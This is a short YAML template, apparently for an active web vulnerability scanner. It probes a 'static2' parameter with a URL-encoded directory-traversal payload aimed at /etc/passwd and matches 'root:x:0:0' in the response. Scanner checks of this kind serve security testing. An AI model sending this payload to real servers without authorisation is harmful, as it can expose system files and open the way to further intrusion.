id: lfi6-1018
name: 'Traversal in static2'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via static2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      static2:
        - '..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
